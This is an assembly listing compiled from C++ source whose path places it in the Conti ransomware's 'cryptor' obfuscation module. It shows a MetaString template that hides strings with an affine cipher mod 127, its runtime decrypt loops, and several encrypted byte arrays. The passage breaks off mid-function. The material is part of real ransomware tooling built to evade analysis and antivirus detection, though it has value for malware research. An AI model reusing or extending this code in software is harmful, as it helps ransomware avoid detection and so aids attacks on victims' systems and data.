??0?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0e	 mov	 BYTE PTR [rcx+1], 14
  00007	c6 41 02 1d	 mov	 BYTE PTR [rcx+2], 29
  0000b	c6 41 03 0e	 mov	 BYTE PTR [rcx+3], 14
  0000f	c6 41 04 1d	 mov	 BYTE PTR [rcx+4], 29
  00013	c6 41 05 1d	 mov	 BYTE PTR [rcx+5], 29
  00017	c6 41 06 1d	 mov	 BYTE PTR [rcx+6], 29
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0e 00 00
	00		 mov	 r10d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 27	 imul	 ecx, eax, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 04	 mov	 BYTE PTR [rcx+1], 4
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 2b	 mov	 BYTE PTR [rcx+3], 43	; 0000002bH
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 21	 mov	 BYTE PTR [rcx+5], 33	; 00000021H
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 2e	 mov	 BYTE PTR [rcx+9], 46	; 0000002eH
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	c6 41 0b 08	 mov	 BYTE PTR [rcx+11], 8
  0002f	c6 41 0c 30	 mov	 BYTE PTR [rcx+12], 48	; 00000030H
  00033	c6 41 0d 30	 mov	 BYTE PTR [rcx+13], 48	; 00000030H
  00037	c6 41 0e 30	 mov	 BYTE PTR [rcx+14], 48	; 00000030H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 05 00 00
	00		 mov	 r11d, 5
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0b	 sub	 ecx, 11

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 41	 mov	 BYTE PTR [rcx+1], 65	; 00000041H
  00007	c6 41 02 2a	 mov	 BYTE PTR [rcx+2], 42	; 0000002aH
  0000b	c6 41 03 4f	 mov	 BYTE PTR [rcx+3], 79	; 0000004fH
  0000f	c6 41 04 1c	 mov	 BYTE PTR [rcx+4], 28
  00013	c6 41 05 0b	 mov	 BYTE PTR [rcx+5], 11
  00017	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001b	48 8b c1	 mov	 rax, rcx
  0001e	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 04 00 00
	00		 mov	 r11d, 4
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 02	 sub	 ecx, 2

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4e	 mov	 BYTE PTR [rcx+1], 78	; 0000004eH
  00007	c6 41 02 5c	 mov	 BYTE PTR [rcx+2], 92	; 0000005cH
  0000b	c6 41 03 78	 mov	 BYTE PTR [rcx+3], 120	; 00000078H
  0000f	c6 41 04 02	 mov	 BYTE PTR [rcx+4], 2
  00013	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 09 00 00
	00		 mov	 r10d, 9
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 69 00 00 00	 mov	 eax, 105		; 00000069H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 59	 mov	 BYTE PTR [rcx+1], 89	; 00000059H
  00007	c6 41 02 13	 mov	 BYTE PTR [rcx+2], 19
  0000b	c6 41 03 70	 mov	 BYTE PTR [rcx+3], 112	; 00000070H
  0000f	c6 41 04 14	 mov	 BYTE PTR [rcx+4], 20
  00013	c6 41 05 59	 mov	 BYTE PTR [rcx+5], 89	; 00000059H
  00017	c6 41 06 4d	 mov	 BYTE PTR [rcx+6], 77	; 0000004dH
  0001b	c6 41 07 7b	 mov	 BYTE PTR [rcx+7], 123	; 0000007bH
  0001f	c6 41 08 14	 mov	 BYTE PTR [rcx+8], 20
  00023	c6 41 09 69	 mov	 BYTE PTR [rcx+9], 105	; 00000069H
  00027	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002b	48 8b c1	 mov	 rax, rcx
  0002e	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 05 00 00
	00		 mov	 r10d, 5
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1a 00 00 00	 mov	 eax, 26
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

